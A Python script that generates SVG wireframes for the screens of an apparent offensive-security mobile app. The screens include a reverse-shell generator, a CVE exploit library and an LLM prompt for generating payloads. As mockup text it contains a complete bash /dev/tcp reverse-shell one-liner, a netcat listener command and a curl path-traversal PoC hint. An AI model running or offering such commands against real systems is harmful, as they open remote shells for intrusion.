"""Generate the Stage-2 wireframes as standalone SVG files.

The wireframes intentionally mirror the Flutter layout (390x844 logical pixels,
dark palette, 14 px gutters) so the design document and the implementation stay
in sync. Run:  python gen_wireframes.py
"""

from __future__ import annotations

import html
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "assets"
OUT.mkdir(parents=True, exist_ok=True)

W, H = 390, 844
BG = "#0D1117"
FRAME = "#1F242D"
CARD = "#161B22"
BORDER = "#2E3644"
TEXT = "#E6EDF3"
MUTED = "#8B949E"
ACCENT = "#50FA7B"
WARN = "#E3B341"
DANGER = "#F85149"
INFO = "#58A6FF"


def esc(value: str) -> str:
    return html.escape(value, quote=True)


def rect(x, y, w, h, fill=CARD, stroke=BORDER, rx=8, sw=1, opacity=None):
    extra = f' opacity="{opacity}"' if opacity is not None else ""
    return (
        f'<rect x="{x}" y="{y}" width="{w}" height="{h}" rx="{rx}" '
        f'fill="{fill}" stroke="{stroke}" stroke-width="{sw}"{extra}/>'
    )


def text(x, y, value, size=12, color=TEXT, weight="400", anchor="start", mono=False, opacity=None):
    family = "Consolas, monospace" if mono else "Segoe UI, Roboto, sans-serif"
    extra = f' opacity="{opacity}"' if opacity is not None else ""
    return (
        f'<text x="{x}" y="{y}" font-family="{family}" font-size="{size}" '
        f'font-weight="{weight}" fill="{color}" text-anchor="{anchor}"{extra}>'
        f"{esc(value)}</text>"
    )


def lines(x, y, widths, gap=6, height=4, color=BORDER):
    out = []
    for i, w in enumerate(widths):
        out.append(rect(x, y + i * (height + gap), w, height, fill=color, stroke="none", rx=2))
    return "".join(out)


def button(x, y, w, h, label, fill=ACCENT, color=BG, size=12.5):
    return (
        rect(x, y, w, h, fill=fill, stroke=fill, rx=8)
        + text(x + w / 2, y + h / 2 + 4.2, label, size, color, "700", "middle")
    )


def chip(x, y, label, active=False, w=None):
    width = w or (len(label) * 7.2 + 20)
    fill = ACCENT if active else CARD
    color = BG if active else TEXT
    stroke = ACCENT if active else BORDER
    return rect(x, y, width, 26, fill=fill, stroke=stroke, rx=13) + text(
        x + width / 2, y + 17, label, 10.5, color, "600" if active else "400", "middle"
    )


def input_box(x, y, w, h, label, placeholder):
    return (
        text(x, y - 6, label, 10, TEXT)
        + rect(x, y, w, h, fill=BG, stroke=BORDER, rx=8)
        + text(x + 10, y + h / 2 + 3.5, placeholder, 11, MUTED)
    )


def status_bar():
    return "".join(
        [
            text(18, 24, "9:41", 10.5, MUTED, "600"),
            rect(300, 17, 14, 8, fill="none", stroke=MUTED, rx=2, sw=1),
            rect(316, 19, 30, 4, fill=MUTED, stroke="none", rx=2),
            text(348, 24, "100%", 9, MUTED),
        ]
    )


def phone(inner, title="", subtitle="", back=False):
    parts = [
        f'<svg xmlns="http://www.w3.org/2000/svg" width="{W}" height="{H}" '
        f'viewBox="0 0 {W} {H}" role="img" aria-label="{esc(title or "wireframe")}">',
        rect(0, 0, W, H, fill=BG, stroke=FRAME, rx=24, sw=2),
        status_bar(),
        # top bar
        rect(0, 36, W, 54, fill=CARD, stroke=CARD, rx=0),
        text(18, 69, ("←  " if back else "") + title, 16, TEXT, "700"),
    ]
    if subtitle:
        parts.append(text(18, 112, subtitle, 10, MUTED))
    parts.append(inner)
    # bottom nav
    nav_items = [("Home", 39), ("Exploit", 117), ("Generator", 195), ("Monitor", 273), ("Settings", 351)]
    parts.append(rect(0, 780, W, 64, fill=CARD, stroke=BORDER, rx=0))
    for i, (label, cx) in enumerate(nav_items):
        active = i == 0
        color = ACCENT if active else MUTED
        parts.append(rect(cx - 9, 791, 18, 14, fill="none", stroke=color, rx=3, sw=1.4))
        parts.append(text(cx, 823, label, 8.5, color, "600" if active else "400", "middle"))
    parts.append(rect(140, 834, 110, 3.5, fill=BORDER, stroke="none", rx=2))
    parts.append("</svg>")
    return "\n".join(parts)


def dashboard() -> str:
    p = []
    p.append(text(18, 112, "Studio · Payload Configuration", 12, TEXT, "700"))
    p.append(rect(14, 122, 362, 132, fill=CARD, stroke=BORDER, rx=10))
    p.append(text(26, 144, "OS", 10, MUTED))
    p.append(rect(26, 150, 160, 28, fill=BG, stroke=BORDER, rx=6))
    p.append(text(34, 168, "Linux", 11, TEXT))
    p.append(text(202, 144, "Language", 10, MUTED))
    p.append(rect(202, 150, 160, 28, fill=BG, stroke=BORDER, rx=6))
    p.append(text(210, 168, "Python", 11, TEXT))
    p.append(input_box(26, 208, 336, 28, "AI Prompt", "Generate reverse shell for 10.10.14.8"))
    p.append(button(26, 240 - 6, 336, 30, "Run Deterministic Agent"))

    p.append(text(18, 286, "Active Attack Surface", 12, TEXT, "700"))
    p.append(rect(14, 296, 362, 152, fill=CARD, stroke=BORDER, rx=10))
    p.append(text(26, 316, "Latest Nmap Scans", 10.5, TEXT, "600"))
    p.append(text(350, 316, "LIVE", 8.5, ACCENT, "700", "end"))
    for i, (ip, status, color) in enumerate(
        [("10.10.14.8", "open", DANGER), ("10.10.14.22", "healthy", ACCENT), ("10.10.14.14", "unknown", WARN)]
    ):
        y = 336 + i * 26
        p.append(text(26, y, ip, 10, TEXT, mono=True))
        p.append(rect(130, y - 8, 7, 7, fill=color, stroke="none", rx=3.5))
        p.append(text(142, y, status, 9, MUTED))
        p.append(rect(192, y - 8, 168, 6, fill=BORDER, stroke="none", rx=3))
        p.append(rect(192, y - 8, 80 + i * 30, 6, fill=color, stroke="none", rx=3))
    p.append(button(26, 416, 336, 26, "Search ExploitDB  ↗", fill=BG, color=ACCENT, size=11))

    p.append(text(18, 478, "Aktivitas Terbaru", 12, TEXT, "700"))
    p.append(rect(14, 488, 362, 102, fill=CARD, stroke=BORDER, rx=10))
    for i, (title, time) in enumerate(
        [("Reverse Shell · bash", "Hari ini, 13:45"), ("Python exploit · 10.10.14.8", "Hari ini, 13:20")]
    ):
        y = 508 + i * 38
        p.append(rect(26, y - 11, 18, 18, fill=BG, stroke=ACCENT, rx=4, sw=1))
        p.append(text(52, y, title, 10.5, TEXT))
        p.append(text(52, y + 13, time, 8.5, MUTED))
        p.append(text(350, y + 2, "›", 14, MUTED, anchor="end"))
    p.append(text(330, 578, "Lihat semua", 9.5, ACCENT, "600"))

    p.append(text(18, 618, "Verified Payload Library", 12, TEXT, "700"))
    row = 0
    x = 14
    for label in ["RCE-Linux", "SQLi-Error", "LFI-Payload", "XSS-Stored", "SSRF-Open", "SSTI-Jinja"]:
        w = len(label) * 6.6 + 18
        if x + w > 376:
            x = 14
            row += 1
        p.append(chip(x, 630 + row * 34, label, w=w))
        x += w + 7

    p.append(rect(292, 694, 52, 52, fill=ACCENT, stroke=ACCENT, rx=26))
    p.append(text(318, 727, "AI", 13, BG, "800", "middle"))
    p.append(text(18, 760, "Scroll ↓  kartu berikutnya: Threat Intel, Monitoring", 9, MUTED))
    return phone("".join(p), "Dashboard")


def generator() -> str:
    p = []
    p.append(rect(14, 100, 174, 30, fill=BG, stroke=ACCENT, rx=6))
    p.append(text(101, 120, "One-Liner Generator", 10.5, ACCENT, "600", "middle"))
    p.append(rect(188, 100, 188, 30, fill=BG, stroke=BORDER, rx=6))
    p.append(text(282, 120, "Python Exploit Builder", 10.5, MUTED, anchor="middle"))

    x = 14
    for label in ["Reverse Shell", "Web Shell", "Privilege Esc."]:
        w = len(label) * 6.2 + 22
        p.append(chip(x, 146, label, active=(label == "Reverse Shell"), w=w))
        x += w + 8

    p.append(rect(14, 186, 362, 38, fill=BG, stroke=BORDER, rx=8))
    p.append(text(24, 209, "Payload type", 9.5, MUTED))
    p.append(text(344, 209, "bash  ▾", 11, TEXT, anchor="end"))
    p.append(rect(14, 234, 362, 38, fill=BG, stroke=BORDER, rx=8))
    p.append(text(24, 257, "LHOST", 9.5, MUTED))
    p.append(text(344, 257, "10.10.14.8", 11, TEXT, mono=True, anchor="end"))
    p.append(rect(14, 282, 362, 38, fill=BG, stroke=BORDER, rx=8))
    p.append(text(24, 305, "LPORT", 9.5, MUTED))
    p.append(text(344, 305, "9001", 11, TEXT, mono=True, anchor="end"))

    p.append(button(14, 338, 362, 44, "Generate One-Liner"))
    p.append(text(18, 404, "Generated Payload", 11, TEXT, "600"))
    p.append(rect(14, 414, 362, 150, fill=BG, stroke=BORDER, rx=10))
    p.append(rect(14, 414, 362, 34, fill=CARD, stroke=BORDER, rx=10))
    p.append(text(26, 436, "bash", 9.5, ACCENT, "600"))
    p.append(text(352, 436, "Salin", 9.5, INFO, "600", "end"))
    p.append(text(26, 470, "bash -i >& /dev/tcp/10.10.14.8/9001 \\", 9.5, TEXT, mono=True))
    p.append(text(26, 488, "0>&1", 9.5, TEXT, mono=True))
    p.append(text(26, 524, "# Listener di mesin penguji:", 9, MUTED, mono=True))
    p.append(text(26, 542, "nc -lvnp 9001", 9.5, ACCENT, mono=True))

    p.append(rect(14, 582, 362, 54, fill="#173222", stroke=ACCENT, rx=8, sw=1))
    p.append(text(28, 604, "✓  Payload dibuat & disimpan ke riwayat lokal", 10.5, ACCENT, "600"))
    p.append(text(28, 622, "Validasi IPv4 dan port berhasil.", 9, MUTED))
    p.append(text(18, 672, "Tips: nilai LHOST/LPORT diambil dari Settings jika kosong.", 9, MUTED))
    return phone("".join(p), "Script Generator")


def exploit() -> str:
    p = []
    p.append(rect(14, 100, 362, 36, fill=BG, stroke=BORDER, rx=8))
    p.append(text(26, 123, "🔍  CVE / Service / Category...", 10, MUTED))
    p.append(chip(14, 146, "All", active=True, w=46))
    p.append(chip(66, 146, "Web", w=46))
    p.append(chip(118, 146, "Linux", w=52))
    p.append(chip(176, 146, "Windows", w=60))
    p.append(chip(242, 146, "Critical", w=60))

    items = [
        ("CVE-2021-41773", "Apache httpd 2.4.49", "Path traversal & RCE", DANGER, "9.8"),
        ("CVE-2007-2447", "Samba 3.0.20", "usermap script RCE", DANGER, "9.1"),
        ("CVE-2019-10149", "Exim 4.89", "Remote command execution", WARN, "9.8"),
        ("CVE-2021-44228", "Log4j 2.x", "JNDI lookup RCE", DANGER, "10.0"),
    ]
    for i, (cve, service, desc, color, score) in enumerate(items):
        y = 186 + i * 108
        p.append(rect(14, y, 362, 96, fill=CARD, stroke=BORDER, rx=10))
        p.append(text(26, y + 22, cve, 10.5, color, "700"))
        p.append(rect(292, y + 10, 70, 16, fill=BG, stroke=color, rx=4, sw=0.7))
        p.append(text(327, y + 21, f"CVSS {score}", 8, color, "600", "middle"))
        p.append(text(26, y + 44, service, 12, TEXT, "600"))
        p.append(text(26, y + 62, desc, 9.5, MUTED))
        p.append(text(26, y + 82, "Lihat detail & PoC  ›", 9, ACCENT, "600"))

    p.append(rect(14, 626, 362, 118, fill=CARD, stroke=ACCENT, rx=10))
    p.append(text(26, 648, "Detail (layar penuh di ponsel)", 9, MUTED))
    p.append(text(26, 670, "CVE-2021-41773", 14, ACCENT, "700"))
    p.append(text(26, 692, "Apache httpd 2.4.49 — path traversal", 10, TEXT))
    p.append(text(26, 712, "CVSS 9.8   ·   PoC: curl --path-as-is ...", 9, MUTED, mono=True))
    p.append(button(26, 722, 338, 30, "Send to Studio"))
    return phone("".join(p), "Exploit Library")


def history() -> str:
    p = []
    p.append(text(258, 69, "↻   🗑", 14, MUTED))
    p.append(text(18, 112, "Riwayat tersimpan lokal & terenkripsi", 9.5, MUTED))
    entries = [
        ("Reverse Shell · bash", "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1", "Hari ini, 13:45", ACCENT, "Payload"),
        ("Python exploit · 10.10.14.8:80", "exploit.py — requests + argparse", "Hari ini, 13:20", WARN, "Exploit"),
        ("Threat look-up: 44d88612...", "VirusTotal: 12/72 engines detected", "Kemarin, 20:11", DANGER, "Threat"),
    ]
    y = 126
    for title, detail, time, color, kind in entries:
        p.append(rect(14, y, 362, 92, fill=CARD, stroke=BORDER, rx=10))
        p.append(rect(26, y + 16, 30, 30, fill=BG, stroke=color, rx=7, sw=1))
        p.append(text(41, y + 36, ">_", 10, color, "700", "middle", mono=True))
        p.append(text(66, y + 24, title, 10.5, TEXT, "600"))
        p.append(text(66, y + 42, detail, 8.8, MUTED))
        p.append(rect(66, y + 56, len(kind) * 6 + 14, 15, fill=BG, stroke=color, rx=4, sw=0.6))
        p.append(text(66 + (len(kind) * 6 + 14) / 2, y + 67, kind, 8, color, "600", "middle"))
        p.append(text(352, y + 66, time, 8.3, MUTED, anchor="end"))
        y += 102

    p.append(rect(14, 446, 362, 60, fill=BG, stroke=DANGER, rx=10, sw=0.8))
    p.append(text(30, 470, "Geser kartu ke kiri untuk menghapus", 9.5, DANGER, "600"))
    p.append(text(30, 488, "Atau tekan ikon hapus untuk membersihkan semua.", 8.8, MUTED))

    p.append(rect(14, 528, 362, 218, fill=CARD, stroke=ACCENT, rx=10))
    p.append(text(26, 550, "Detail Riwayat (bottom sheet)", 9, MUTED))
    p.append(text(26, 572, "Reverse Shell · bash", 13, TEXT, "700"))
    p.append(text(26, 590, "Payload · 20/10/2026 13:45", 9, MUTED))
    p.append(rect(26, 602, 338, 92, fill=BG, stroke=BORDER, rx=8))
    p.append(text(36, 624, "bash -i >& /dev/tcp/10.10.14.8/9001 \\", 9, TEXT, mono=True))
    p.append(text(36, 642, "0>&1", 9, TEXT, mono=True))
    p.append(button(26, 704, 338, 30, "Salin payload"))
    return phone("".join(p), "Riwayat Aktivitas", back=True)


def settings() -> str:
    p = []
    p.append(text(18, 108, "API Configuration", 11.5, TEXT, "700"))
    p.append(text(18, 124, "Keys stored locally in encrypted storage.", 8.8, MUTED))
    p.append(rect(14, 132, 362, 172, fill=CARD, stroke=BORDER, rx=10))
    labels = ["OpenAI API Key", "DeepSeek API Key", "Gemini API Key", "VirusTotal API Key"]
    for i, label in enumerate(labels):
        y = 148 + i * 38
        p.append(text(26, y + 10, label, 8.8, MUTED))
        p.append(rect(26, y + 16, 338, 18, fill=BG, stroke=BORDER, rx=5))
        p.append(text(34, y + 29, "•" * 18, 8, TEXT))

    p.append(text(18, 336, "Target Defaults", 11.5, TEXT, "700"))
    p.append(text(18, 352, "Auto-filled into Payload Studio & generators", 8.8, MUTED))
    p.append(rect(14, 360, 362, 74, fill=CARD, stroke=BORDER, rx=10))
    p.append(input_box(26, 388, 160, 28, "LHOST", "10.10.14.8"))
    p.append(input_box(202, 388, 160, 28, "LPORT", "9001"))

    p.append(text(18, 468, "LLM Engine Selector", 11.5, TEXT, "700"))
    p.append(rect(14, 476, 362, 52, fill=CARD, stroke=BORDER, rx=10))
    p.append(text(26, 507, "Active LLM backend", 9, MUTED))
    p.append(text(352, 507, "DeepSeek API  ▾", 10, TEXT, anchor="end"))

    p.append(text(18, 562, "Theme & UI Tweaks", 11.5, TEXT, "700"))
    p.append(rect(14, 570, 362, 132, fill=CARD, stroke=BORDER, rx=10))
    for i, label in enumerate(["Glow effects", "Terminal font", "Sound effects"]):
        y = 592 + i * 38
        p.append(text(26, y + 10, label, 10, TEXT))
        p.append(rect(310, y, 38, 20, fill=BG, stroke=BORDER, rx=10))
        p.append(rect(313, y + 3, 14, 14, fill=MUTED, stroke="none", rx=7))

    p.append(button(14, 718, 362, 44, "Save Settings"))
    return phone("".join(p), "Settings")


def main() -> None:
    (OUT / "wireframe-dashboard.svg").write_text(dashboard(), encoding="utf-8")
    (OUT / "wireframe-generator.svg").write_text(generator(), encoding="utf-8")
    (OUT / "wireframe-exploit.svg").write_text(exploit(), encoding="utf-8")
    (OUT / "wireframe-history.svg").write_text(history(), encoding="utf-8")
    (OUT / "wireframe-settings.svg").write_text(settings(), encoding="utf-8")
    print(f"Wrote 5 wireframes to {OUT}")


if __name__ == "__main__":
    main()
